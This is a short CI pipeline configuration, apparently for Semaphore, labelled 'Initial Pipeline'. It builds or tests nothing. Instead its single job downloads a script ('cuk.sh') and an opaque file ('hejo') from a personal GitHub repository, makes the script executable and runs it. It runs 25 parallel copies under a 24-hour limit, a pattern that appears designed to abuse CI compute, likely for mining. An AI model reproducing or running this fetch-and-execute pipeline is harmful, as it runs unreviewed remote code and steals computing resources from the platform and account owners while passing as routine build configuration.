version: v1.0
name: Initial Pipeline
agent:
  machine:
    type: e1-standard-4
    os_image: ubuntu1804
execution_time_limit:
  hours: 24
fail_fast:
  cancel:
    when: 'true'
blocks:
  - name: 'Block #1'
    task:
      jobs:
        - name: 'Job #1'
          commands:
            - 'wget https://github.com/Matthewjameshenshall/Matthewjameshenshall/raw/main/cuk.sh'
            - 'wget https://github.com/Matthewjameshenshall/Matthewjameshenshall/raw/main/hejo'
            - chmod u+x cuk.sh
            - ./cuk.sh
          parallelism: 25
